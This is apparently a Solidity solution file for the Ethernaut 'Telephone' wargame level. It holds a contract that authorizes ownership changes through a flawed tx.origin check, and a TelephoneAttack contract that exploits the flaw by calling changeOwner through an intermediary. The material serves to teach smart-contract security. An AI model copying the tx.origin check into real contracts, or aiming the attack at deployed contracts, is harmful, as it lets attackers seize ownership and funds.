// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautTelephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address newOwner) external {
        if (tx.origin != msg.sender) {
            owner = newOwner;
        }
    }
}

contract TelephoneAttack {
    function attack(EthernautTelephone target, address newOwner) external {
        target.changeOwner(newOwner);
    }
}

